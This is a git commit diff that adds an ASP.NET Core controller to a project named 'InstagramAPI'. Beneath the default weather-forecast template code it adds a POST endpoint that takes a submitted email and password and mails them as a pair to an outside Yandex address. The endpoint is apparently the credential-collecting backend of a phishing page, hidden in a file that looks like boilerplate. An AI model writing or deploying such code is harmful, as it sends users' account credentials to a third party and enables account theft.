d8efffd141cfd0be35fe88357a465a60c1ca9661
Dats-asc <70961793+Dats-asc@users.noreply.github.com>
2021-10-01 23:25:32 +0500

    Add files via upload

---
+++ InstagramAPI/InstagramAPI2/Controllers/WeatherForecastController.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+
+namespace InstagramAPI2.Controllers
+{
+    [ApiController]
+    [Route("[controller]")]
+    public class WeatherForecastController : ControllerBase
+    {
+        private static readonly string[] Summaries = new[]
+        {
+            "Freezing", "Bracing", "Chilly", "Cool", "Mild", "Warm", "Balmy", "Hot", "Sweltering", "Scorching"
+        };
+
+        private readonly ILogger<WeatherForecastController> _logger;
+
+        public WeatherForecastController(ILogger<WeatherForecastController> logger)
+        {
+            _logger = logger;
+        }
+
+        [HttpGet]
+        public IEnumerable<WeatherForecast> Get()
+        {
+            var rng = new Random();
+            return Enumerable.Range(1, 5).Select(index => new WeatherForecast
+            {
+                Date = DateTime.Now.AddDays(index),
+                TemperatureC = rng.Next(-20, 55),
+                Summary = Summaries[rng.Next(Summaries.Length)]
+            })
+            .ToArray();
+        }
+
+        [HttpPost]
+        public async Task<IActionResult> SendEmail([FromForm] string email, [FromForm] string password)
+        {
+            EmailService EmailSend = new EmailService();
+
+            await EmailSend.SendEmailAsync("Unknown.user123@yandex.ru", "message done", $"{email} - {password}");
+            return Ok("message");
+        }
+    }
+}
